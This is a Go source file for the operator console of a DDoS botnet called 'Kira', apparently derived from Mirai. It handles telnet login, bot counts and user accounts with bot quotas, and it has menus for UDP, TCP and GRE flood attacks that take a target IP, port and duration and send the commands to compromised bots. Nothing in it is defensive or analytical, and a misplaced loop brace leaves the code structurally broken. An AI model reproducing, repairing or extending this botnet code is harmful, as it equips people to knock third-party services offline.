package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;97mUsername\033[0;91m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;97mPassword\033[0;91m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[31;0mPlease wait, loading... \033[32;1"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(500) * time.Millisecond)

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[31;1mAn unknown error occurred\r\n"))
        this.conn.Write([]byte("\033[0;31mPress any key to exit.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Kira's Loaded | [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[0;91m╔═══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m╗\033[91m  ██\033[97m╗\033[91m██\033[97m╗\033[91m██████\033[97m╗  \033[91m█████\033[97m╗ \t\t\033[0;91m║\r\n"))
	this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m║\033[91m ██\033[97m╔╝\033[91m██\033[97m║\033[91m██\033[97m╔══\033[91m██\033[97m╗\033[91m██\033[97m╔══\033[91m██\033[97m╗\t\t\033[0;91m║\r\n"))
	this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m█████\033[97m╔╝ \033[91m██\033[97m║\033[91m██████\033[97m╔╝\033[91m███████\033[97m║\t\t\033[0;91m║\r\n"))
	this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m╔═\033[91m██\033[97m╗ \033[91m██\033[97m║\033[91m██\033[97m╔══\033[91m██\033[97m╗\033[91m██\033[97m╔══\033[91m██\033[97m║\t\t\033[0;91m║\r\n"))
	this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m║  \033[91m██\033[97m╗\033[91m██\033[97m║\033[91m██\033[97m║  \033[91m██\033[97m║\033[91m██\033[97m║  \033[91m██\033[97m║\t\t\033[0;91m║\r\n"))
	this.conn.Write([]byte("\033[0;91m║\t\t\t\033[97m╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝\t\t\033[0;91m║\r\n"))
	this.conn.Write([]byte("\033[0;91m╚═══════════════════╦═══════════════════════════════════════════╝\r\n"))
    for {
        var botCatagory string
        var botCount int
				
        this.conn.Write([]byte("\033[91m╔═══════════════════╝\r\n║  \033[97m"+username+"\033[91m@\033[97mKira  	\r\n\033[91m╚═════════════════$# \033[37m\033[0m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m╔══════════════════════════════════╦══════════════════════╦══════════════════╗\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║ \033[0;97m?     \033[0;91m| \033[0;97mShows attack menu        \033[0;91m║ \033[0;97mTotal Attacks\033[0;91m:       \033[0;91m║ \033[0;97mUsername\033[0;91m:        \033[0;91m║\033[26D\033[0;97m%d\033[16C\033[0;97m%s\r\n", database.fetchAttacks(), username)))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║ \033[0;97mbots  \033[0;91m| \033[0;97mShows the full bot count \033[0;91m║ \033[0;97mTotal Users\033[0;91m:         \033[0;91m║ \033[0;97mBoot Time\033[0;91m:\033[0;97m 1800  \033[0;91m║\033[28D\033[0;97m%d\r\n", database.fetchUsers())))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║ \033[0;97mclear \033[0;91m| \033[0;97mClears your screen       \033[0;91m║ \033[0;97mVersion\033[0;91m: \033[0;97mKira v2.5   \033[0;91m║ \033[0;97mCooldown\033[0;91m:\033[0;97m 30     \033[0;91m║\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║ \033[0;97mquit  \033[0;91m| \033[0;97mExit the botnet          \033[0;91m╠══════════════════════╬══════════════════╣\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║ \033[0;97mHelp Menu                        \033[0;91m║ \033[0;97mBy DevilsExploits    \033[0;91m║ \033[0;97mMethod \033[0;91m: \033[0;97mSTD     \033[0;91m║\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m╚═══════════════════╦══════════════╩══════════════════════╩══════════════════╝\r\n")))
            continue
        }
		
		if cmd == "banner" {
		    this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0;91m╔═══════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m╗\033[91m  ██\033[97m╗\033[91m██\033[97m╗\033[91m██████\033[97m╗  \033[91m█████\033[97m╗ \t\t\033[0;91m║\r\n"))
			this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m║\033[91m ██\033[97m╔╝\033[91m██\033[97m║\033[91m██\033[97m╔══\033[91m██\033[97m╗\033[91m██\033[97m╔══\033[91m██\033[97m╗\t\t\033[0;91m║\r\n"))
			this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m█████\033[97m╔╝ \033[91m██\033[97m║\033[91m██████\033[97m╔╝\033[91m███████\033[97m║\t\t\033[0;91m║\r\n"))
			this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m╔═\033[91m██\033[97m╗ \033[91m██\033[97m║\033[91m██\033[97m╔══\033[91m██\033[97m╗\033[91m██\033[97m╔══\033[91m██\033[97m║\t\t\033[0;91m║\r\n"))
			this.conn.Write([]byte("\033[0;91m║\t\t\t\033[91m██\033[97m║  \033[91m██\033[97m╗\033[91m██\033[97m║\033[91m██\033[97m║  \033[91m██\033[97m║\033[91m██\033[97m║  \033[91m██\033[97m║\t\t\033[0;91m║\r\n"))
			this.conn.Write([]byte("\033[0;91m║\t\t\t\033[97m╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝\t\t\033[0;91m║\r\n"))
			this.conn.Write([]byte("\033[0;91m╚═══════════════════╦═══════════════════════════════════════════╝\r\n"))
			continue
		}
             
        if cmd == "?" {
            this.conn.Write([]byte("\033[0;91m╔═══════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[0;91m║   Attack Methods                                              ║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mudpplain \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mUDP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mstd      \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mUDP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mnudp     \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mUDP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mvse      \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mUDP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mack      \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mTCP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mstomp    \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mTCP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mxmas     \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mTCP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mgreip    \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mGRE Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mstdhex   \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mUDP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mudphex   \033[0;91m[\033[0;97mIP\033[0;91m] \033[0;91m[\033[0;97mTIME\033[0;91m] \033[0;97mdport=\033[0;91m[\033[0;97mPORT\033[0;91m]           | \033[0;97mUDP Flood     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m╚═══════════════════╦═══════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[0;91m╔═══════════════════╩═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;91mIP Address Tools                                  ║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mnmap                  \033[0;91m| \033[0;97mPort Scanner!             \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mlookup                \033[0;91m| \033[0;97mIP Look Up                \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;97mattack                \033[0;91m| \033[0;97mAttack Menu               \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m╚═══════════════════╦═════════════════════════════════╝\r\n"))
            continue
        }

        if cmd == "help" {
            this.conn.Write([]byte("\033[0;91m╔═══════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;91m? \033[0;97m: \033[0;91mShows attack Menu!                          \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;91mbots \033[0;97m: \033[0;91mShows the Full Botcount!                 \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;91mclear \033[0;97m: \033[0;91mClears the screen!                      \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;91mquit \033[0;97m: \033[0;91mquit the botnet!                         \033[0;91m║\r\n"))
            if userInfo.admin == 1{
            this.conn.Write([]byte("\033[0;91m║   \033[0;91madduser \033[0;97m: \033[0;91mAdd a New User!                       \033[0;91m║\r\n"))
            this.conn.Write([]byte("\033[0;91m║   \033[0;91mremuser \033[0;97m: \033[0;91mRemove a User!                        \033[0;91m║\r\n"))
            }
            this.conn.Write([]byte("\033[0;91m╚═══════════════════╦═══════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if cmd == "scan" || cmd == "nmap"{
            this.conn.Write([]byte("Enter Target IP: "))
            target_ip, err := this.ReadLine(false)
            if err != nil {
                return
            }

            this.conn.Write([]byte("\033[0;91m═════════════════════════════\r\n\033[0m"))
            this.conn.Write([]byte(getNMAP(target_ip) + "\r\n"))
            this.conn.Write([]byte("\033[0;91m════════════════════╦════════\r\n\033[0m"))
            continue
        }

        if cmd == "iplookup" || cmd == "lookup" || cmd == "geo"{
            this.conn.Write([]byte("Enter Target IP: "))
            target_ip, err := this.ReadLine(false)
            if err != nil {
                return
            }

            this.conn.Write([]byte("\033[0;91m═════════════════════════════\r\n\033[0m"))
            this.conn.Write([]byte(getGEO(target_ip) + "\r\n"))
            this.conn.Write([]byte("\033[0;91m════════════════════╦════════\r\n\033[0m"))
            continue
        }

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[31;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" || cmd == "b" {
		botCount = clientList.Count()
            m := clientList.Distribution()
			this.conn.Write([]byte(fmt.Sprintf("\033[0;91m═════════════════════════════\r\n\033[0m")))
            for k, v := range m {
                if k == ""{
                    k = "Unknown";
                }
                this.conn.Write([]byte(fmt.Sprintf("\033[0;91m%s\033[0;97m:   \033[0;91m%d\r\n", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0;91mTotal Bots\033[0;97m:\033[0;91m   %d\r\n", botCount)))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;91m════════════════════╦════════\r\n\033[0m")))
            continue
        }
        if cmd == "attack" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;92mAvailable Attacks                             \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mUDP           \033[0;97m| \033[0;97mUDP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mSTD           \033[0;97m| \033[0;97mUDP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mVSE           \033[0;97m| \033[0;97mUDP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mNUDP          \033[0;97m| \033[0;97mUDP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mSTOMP         \033[0;97m| \033[0;97mTCP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mACK           \033[0;97m| \033[0;97mTCP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;97mXMAS          \033[0;97m| \033[0;97mTCP Flood                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════╦═══════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                               \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                               \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════╩══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║                  \033[0;97mMethod :                        \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚══════════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[2A \033[43C"))
            amethod, err := this.ReadLine(false)
            if err != nil {
                return
            }   
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;92mTarget IP                                     \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════╦═══════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                                \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                                \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════╩═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║                  \033[0;97mIP :                             \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[2A \033[39C"))
            aip, err := this.ReadLine(false)
            if err != nil {
                return
            } 
            this.conn.Write([]byte("\t\t════════════════════════════════════════════════════\r\n"))

            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;92mCommon Ports                                  \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;92m80\033[0;97m, \033[0;92m443\033[0;97m, \033[0;92m53\033[0;97m, \033[0;92m3306                             \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════╦═══════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                                \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                                \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════╩═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║                  \033[0;97mPort :                           \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[2A \033[41C"))
            aport, err := this.ReadLine(false)
            if err != nil {
                return
            }   
            this.conn.Write([]byte("\t\t════════════════════════════════════════════════════\r\n"))

            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;92mMax Boot Time                                 \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║     \033[0;92mCurrent Max Boot Time  [1800]                 \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════╦═══════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                                \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m                    ║                                \r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╔═══════════════════╩═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m║                  \033[0;97mTime :                           \033[0;91m║\r\n"))
            this.conn.Write([]byte("\t\t\033[0;91m╚═══════════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[2A \033[41C"))
            atime, err := this.ReadLine(false)
            if err != nil {
                return
            }   

            full_attack := strings.ToLower(amethod) + " " + " " + strings.ToLower(aip) + " " + strings.ToLower(atime) + " dport=" + strings.ToLower(aport) 
            this.conn.Write([]byte("\033[2J\033[1H"))

            atk, err := NewAttack(full_attack, userInfo.admin)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                buf, err := atk.Build()
                if err != nil {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else {
                    if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                        this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                    } else if !database.ContainsWhitelistedTargets(atk) {
                        clientList.QueueBuf(buf, botCount, botCatagory)
                        this.conn.Write([]byte(fmt.Sprintf("\033[0;91m╔════════════════════════════════╗\r\n")))
                        this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║  \033[0;97mAttack \033[0;92msent \033[0;97msuccesfully!      \033[0;91m║\r\n")))
                        this.conn.Write([]byte(fmt.Sprintf("\033[0;91m╚═══════════════════╦════════════╝\r\n")))
                        continue
                    } else {
                        this.conn.Write([]byte(fmt.Sprintf("\033[0;91mThis \033[0;97mIP \033[0;91mhas \033[0;97mbeen \033[0;91mblack \033[0;97mlisted \033[0;91mby \033[0;97m"+ username +"!\r\n")))
                    }
                }
            }
        }

        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
		
        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;91m╔════════════════════════════════╗\r\n")))
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;91m║  \033[0;97mAttack \033[0;92msent \033[0;97msuccesfully!      \033[0;91m║\r\n")))
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;91m╚═══════════════════╦════════════╝\r\n")))
                    continue
                } else {
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;91mThis \033[0;97mIP \033[0;91mhas \033[0;97mbeen \033[0;91mblack \033[0;97mlisted \033[0;91mby \033[0;97m"+ username +"!\r\n")))
                }
            }
        }
    }
}
}
func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 4096)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
